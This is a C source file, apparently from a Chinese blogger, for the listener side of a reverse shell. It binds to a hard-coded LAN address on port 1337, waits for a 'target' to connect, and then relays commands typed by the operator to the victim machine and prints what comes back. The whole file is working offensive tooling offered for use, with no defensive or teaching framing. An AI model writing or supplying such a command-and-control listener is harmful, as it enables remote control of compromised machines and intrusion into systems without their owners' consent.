//by lee
//https://blog.csdn.net/weixin_51055545?type=blog
//gcc server.c -o server
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 1337

void banner(){
	printf("creat by Lee\n");
	printf("version 1.0\n");
}

void execute_command(int client_socket_fd){
	char buf[1024];
	char command[1024];
	int recv_bytes;
	while (1) {
		printf("shell>>");
		fgets(command, sizeof(command), stdin);
		if(send(client_socket_fd, command, strlen(command), 0) == -1){
			perror("❌ send faild!!\n");
			break;
		}
		memset(buf, 0, sizeof(buf));
		recv_bytes = recv(client_socket_fd, buf, sizeof(buf) - 1, 0);
		
		if (recv_bytes > 0){
			buf[recv_bytes] = '\0';
			printf("the output:\n%s\n", buf);
		}else if (recv_bytes == 0){
			perror("❌ recv message faild!!\n");
			break;
		} else {
			perror("❌ recv() faild!!\n");
			break;
		}
	}
}


int main(){

	banner();
	int sock_fd, client_socket_fd;
	struct sockaddr_in server_addr, client_addr;
	socklen_t addr_len = sizeof(client_addr);
	sock_fd = socket(AF_INET, SOCK_STREAM, 0);

	if (sock_fd == -1) {
	perror("❌ creat socket faild!\n");
	exit(1);
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr("192.168.239.131");
	server_addr.sin_port = htons(PORT);
	if( bind(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1){
		perror("❌ bind faild!\n");
		close(sock_fd);
		exit(1);
	}

	if(listen(sock_fd, 5) == -1){
		perror("❌ listen faild!\n");
		close(sock_fd);
		exit(1);
	}

	printf("🕤 listing...\n");
	sleep(3);
	printf("🕤 waiting for target...\n");

	client_socket_fd = accept(sock_fd, (struct sockaddr *)&client_addr, &addr_len);
	if (client_socket_fd == -1){
		perror("❌ connection faild!\n");
		close(sock_fd);
		exit(1);
	}

	printf("✅ target is on!\n");

	execute_command(client_socket_fd);

    close(client_socket_fd);
    close(sock_fd);

	return 0;
}
